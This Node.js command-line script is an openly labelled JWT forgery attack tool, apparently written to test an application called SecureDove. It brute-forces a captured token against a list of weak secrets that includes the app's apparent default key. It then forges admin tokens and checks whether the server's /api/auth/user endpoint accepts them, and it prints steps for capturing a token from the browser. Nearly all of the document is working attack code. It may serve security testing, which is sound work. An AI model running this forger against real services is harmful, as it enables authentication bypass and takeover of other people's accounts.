#!/usr/bin/env node
/**
 * SecureDove JWT Token Forgery Attack Script
 * Attempts to forge JWT tokens using weak secrets
 */

const jwt = require('jsonwebtoken');
const fs = require('fs');

class JWTForger {
    constructor(baseUrl = 'http://localhost:8000') {
        this.baseUrl = baseUrl;
        this.apiUrl = `${baseUrl}/api`;
    }

    // Common weak secrets to try
    getCommonSecrets() {
        return [
            'your-secret-key-change-in-production',
            'secret',
            'password',
            'admin',
            '123456',
            'jwt_secret',
            'secret_key',
            'token_secret',
            'auth_secret',
            'session_secret',
            'secure_dove_secret',
            'securedove',
            'dove_secret',
            'messaging_secret',
            'chat_secret'
        ];
    }

    // Try to decode a token with different secrets
    crackToken(token, secrets = null) {
        if (!secrets) {
            secrets = this.getCommonSecrets();
        }

        console.log('[*] Attempting to crack JWT token...');

        for (const secret of secrets) {
            try {
                const decoded = jwt.verify(token, secret, { ignoreExpiration: true });
                console.log(`[+] SUCCESS! Token cracked with secret: "${secret}"`);
                console.log('[+] Decoded payload:', JSON.stringify(decoded, null, 2));
                return { secret, decoded };
            } catch (error) {
                // Secret didn't work, continue
            }
        }

        console.log('[-] Failed to crack token with common secrets');
        return null;
    }

    // Forge a new token with a known secret
    forgeToken(secret, userId = 1, username = 'admin', expiresIn = '24h') {
        const payload = { userId, username };

        const token = jwt.sign(payload, secret, { expiresIn });

        console.log(`[+] Forged token for user: ${username} (ID: ${userId})`);
        console.log(`[+] Token: ${token}`);

        return token;
    }

    // Test if a forged token works
    async testToken(token) {
        try {
            console.log('[*] Testing forged token against /api/auth/user...');

            const response = await fetch(`${this.apiUrl}/auth/user`, {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                const data = await response.json();
                console.log('[+] SUCCESS! Token accepted by server');
                console.log('[+] User data:', JSON.stringify(data, null, 2));
                return true;
            } else {
                const error = await response.text();
                console.log(`[-] Token rejected: ${response.status} ${error}`);
                return false;
            }
        } catch (error) {
            console.log(`[-] Error testing token: ${error.message}`);
            return false;
        }
    }

    // Capture a token from the application (requires manual interaction)
    captureTokenInstructions() {
        console.log('\n[*] To capture a valid token for cracking:');
        console.log('1. Start the SecureDove application locally');
        console.log('2. Open browser and log in to any account');
        console.log('3. Open Developer Tools (F12)');
        console.log('4. Go to Network tab');
        console.log('5. Perform any API request');
        console.log('6. Copy the "Authorization: Bearer <token>" header');
        console.log('7. Save the token to a file and use it with this script');
    }
}

// CLI interface
async function main() {
    const args = process.argv.slice(2);

    if (args.length < 1) {
        console.log('Usage:');
        console.log('  node jwt_forge.js crack <token> [secrets_file]');
        console.log('  node jwt_forge.js forge <secret> [userId] [username]');
        console.log('  node jwt_forge.js test <token> [baseUrl]');
        console.log('  node jwt_forge.js capture');
        console.log('');
        console.log('Examples:');
        console.log('  node jwt_forge.js crack eyJhbGciOiJIUzI1NiIs...');
        console.log('  node jwt_forge.js forge your-secret-key-change-in-production 1 admin');
        console.log('  node jwt_forge.js test eyJhbGciOiJIUzI1NiIs...');
        process.exit(1);
    }

    const command = args[0];
    const forger = new JWTForger();

    switch (command) {
        case 'crack':
            if (args.length < 2) {
                console.log('[-] Missing token to crack');
                process.exit(1);
            }

            const token = args[1];
            let secrets = null;

            if (args.length > 2) {
                // Load secrets from file
                try {
                    const secretsFile = fs.readFileSync(args[2], 'utf8');
                    secrets = secretsFile.split('\n').map(s => s.trim()).filter(s => s);
                    console.log(`[*] Loaded ${secrets.length} secrets from ${args[2]}`);
                } catch (error) {
                    console.log(`[-] Error loading secrets file: ${error.message}`);
                    process.exit(1);
                }
            }

            const result = forger.crackToken(token, secrets);
            if (result) {
                console.log('\n[*] Now you can forge tokens with this secret!');
                console.log(`Example: node jwt_forge.js forge "${result.secret}"`);
            }
            break;

        case 'forge':
            if (args.length < 2) {
                console.log('[-] Missing secret for forging');
                process.exit(1);
            }

            const secret = args[1];
            const userId = parseInt(args[2]) || 1;
            const username = args[3] || 'admin';

            const forgedToken = forger.forgeToken(secret, userId, username);
            console.log('\n[*] Use this token in Authorization header:');
            console.log(`Authorization: Bearer ${forgedToken}`);
            break;

        case 'test':
            if (args.length < 2) {
                console.log('[-] Missing token to test');
                process.exit(1);
            }

            const testToken = args[1];
            const baseUrl = args[2] || 'http://localhost:8000';

            const testForger = new JWTForger(baseUrl);
            await testForger.testToken(testToken);
            break;

        case 'capture':
            forger.captureTokenInstructions();
            break;

        default:
            console.log(`[-] Unknown command: ${command}`);
            process.exit(1);
    }
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = JWTForger;